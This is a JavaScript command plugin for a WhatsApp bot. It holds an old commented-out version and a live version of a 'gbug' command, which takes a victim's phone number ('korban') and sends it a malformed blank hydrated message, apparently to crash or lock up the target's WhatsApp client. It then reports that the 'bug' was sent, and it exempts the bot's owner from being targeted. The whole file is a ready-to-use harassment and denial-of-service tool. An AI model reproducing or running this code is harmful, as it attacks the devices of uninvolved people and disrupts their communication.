/*let handler = async (m, { conn, usedPrefix: _p, args, text, usedPrefix}) => {

let number = text

let korban = `${number}`

if (!number) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan dikirim', m)

      conn.fakeReply(korban + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast') 

{

    let logs = `[!] Berhasil mengirim BUG wa ke nomor ${korban}`
    conn.reply(m.chat, logs, m)
}}

handler.command = /^(gbug)$/i

handler.owner = true

export default handler*/

let handler = async (m, { Func, conn, usedPrefix: _p, args, text, usedPrefix}) => {

let number = text

let korban = `${number}`

if (!number) throw Func.example(usedPrefix, 'gbug', "Silahkan reply pesan ini dengan nomor yang akan dikirimi BUG")
    
if (number === '6281336990781')

      return conn.reply(m.chat, `Tidak dapat mengirim bug ke BOT`, m)

if (number === '6285334930628')

      return conn.reply(m.chat, `Tidak dapat mengirim bug ke Owner BOT`, m)
if (number === '6281237561088')
    
      return conn.reply(m.chat, `Tidak dapat mengirim bug ke EMPORIA PLAZA`, m)

      await conn.sendHydrated(korban + '@s.whatsapp.net', ` `, ' ',
        ' ', ' ', ' ', ' ', [
        [' ', ` `],
        [' ', ` `],
        [' ', ' '], [' ', ' '], [' ', ' ']], m) 

{

    let logs = `[!] Berhasil mengirim BUG wa ke nomor ${korban}`
    conn.reply(m.chat, logs, m)
}}

handler.command = /^(gbug)$/i

handler.dm = true

export default handler